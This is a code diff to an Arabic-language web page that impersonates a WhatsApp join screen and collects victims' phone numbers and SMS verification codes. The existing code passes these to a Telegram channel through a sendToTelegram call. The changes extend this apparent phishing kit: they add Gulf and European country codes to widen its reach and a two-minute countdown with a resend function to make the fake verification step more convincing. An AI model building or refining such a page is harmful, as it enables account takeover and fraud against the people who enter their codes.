@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -41,6 +41,13 @@
         .chat-icon-large { width: 50px; height: 50px; margin-bottom: 10px; fill: white; }
         .join-text { color: white; margin-bottom: 15px; font-size: 16px; }
         .password-icon { width: 40px; height: 40px; margin: 0 auto 15px; display: block; background-color: #128C7E; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .countdown-timer { 
+            color: #000; /* Black color */
+            font-size: 14px;
+            text-align: center;
+            margin: 10px 0;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -71,9 +78,46 @@
                 <label class="input-label">أدخل رقم الجوال</label>
                 <div class="phone-input-group">
                     <select id="countryCode" class="country-select">
+                        <!-- دول الخليج -->
                         <option value="+966">🇸🇦 السعودية +966</option>
                         <option value="+971">🇦🇪 الإمارات +971</option>
-                        <option value="+20">🇪🇬 مصر +20</option>
+                        <option value="+973">🇧🇭 البحرين +973</option>
+                        <option value="+965">🇰🇼 الكويت +965</option>
+                        <option value="+968">🇴🇲 عمان +968</option>
+                        <option value="+974">🇶🇦 قطر +974</option>
+                        
+                        <!-- دول أوروبا -->
+                        <option value="+43">🇦🇹 النمسا +43</option>
+                        <option value="+32">🇧🇪 بلجيكا +32</option>
+                        <option value="+359">🇧🇬 بلغاريا +359</option>
+                        <option value="+385">🇭🇷 كرواتيا +385</option>
+                        <option value="+357">🇨🇾 قبرص +357</option>
+                        <option value="+420">🇨🇿 التشيك +420</option>
+                        <option value="+45">🇩🇰 الدنمارك +45</option>
+                        <option value="+372">🇪🇪 إستونيا +372</option>
+                        <option value="+358">🇫🇮 فنلندا +358</option>
+                        <option value="+33">🇫🇷 فرنسا +33</option>
+                        <option value="+49">🇩🇪 ألمانيا +49</option>
+                        <option value="+30">🇬🇷 اليونان +30</option>
+                        <option value="+36">🇭🇺 المجر +36</option>
+                        <option value="+354">🇮🇸 آيسلندا +354</option>
+                        <option value="+353">🇮🇪 أيرلندا +353</option>
+                        <option value="+39">🇮🇹 إيطاليا +39</option>
+                        <option value="+371">🇱🇻 لاتفيا +371</option>
+                        <option value="+370">🇱🇹 ليتوانيا +370</option>
+                        <option value="+352">🇱🇺 لوكسمبورغ +352</option>
+                        <option value="+356">🇲🇹 مالطا +356</option>
+                        <option value="+31">🇳🇱 هولندا +31</option>
+                        <option value="+47">🇳🇴 النرويج +47</option>
+                        <option value="+48">🇵🇱 بولندا +48</option>
+                        <option value="+351">🇵🇹 البرتغال +351</option>
+                        <option value="+40">🇷🇴 رومانيا +40</option>
+                        <option value="+421">🇸🇰 سلوفاكيا +421</option>
+                        <option value="+386">🇸🇮 سلوفينيا +386</option>
+                        <option value="+34">🇪🇸 إسبانيا +34</option>
+                        <option value="+46">🇸🇪 السويد +46</option>
+                        <option value="+41">🇨🇭 سويسرا +41</option>
+                        <option value="+44">🇬🇧 بريطانيا +44</option>
                     </select>
                     <input type="tel" id="phoneNumber" class="phone-input" placeholder="رقم الهاتف" inputmode="none" readonly>
                 </div>
@@ -118,6 +162,7 @@
             <div class="verification-container">
                 <label class="input-label">أدخل الرمز المرسل إلى رقم الجوال</label>
                 <p class="sms-notice">سيتم إرسال رمز مكون من 6 أرقام إلى رسائلك النصية</p>
+                <div class="countdown-timer" id="countdownTimer">02:00</div>
                 <div class="verification-inputs">
                     <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
                     <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
@@ -219,6 +264,7 @@
         let verificationAttempts = 0;
         let wrongCode = '';
         let correctCode = '';
+        let countdownInterval;
 
         function generateToken() {
             return 'WA-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 9);
@@ -247,8 +293,45 @@
                 document.getElementById('loadingCircle').style.display = 'none';
                 document.getElementById('phonePage').classList.add('hidden');
                 document.getElementById('verificationPage').classList.remove('hidden');
+                startCountdown();
                 sendToTelegram('verification_request', userCountryCode, userPhone, '', '');
             }, 2000);
+        }
+
+        // عداد التنازلي
+        function startCountdown() {
+            let minutes = 2;
+            let seconds = 0;
+            
+            clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(function() {
+                const timer = document.getElementById('countdownTimer');
+                
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(countdownInterval);
+                        timer.textContent = "انتهى الوقت";
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+                
+                const formattedMinutes = minutes.toString().padStart(2, '0');
+                const formattedSeconds = seconds.toString().padStart(2, '0');
+                timer.textContent = `${formattedMinutes}:${formattedSeconds}`;
+            }, 1000);
+        }
+
+        function resendCode() {
+            startCountdown();
+            document.getElementById('errorMessage').classList.add('hidden');
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            inputs.forEach(input => input.value = '');
+            currentCodeIndex = 0;
         }
 
         // إدارة رمز التحقق
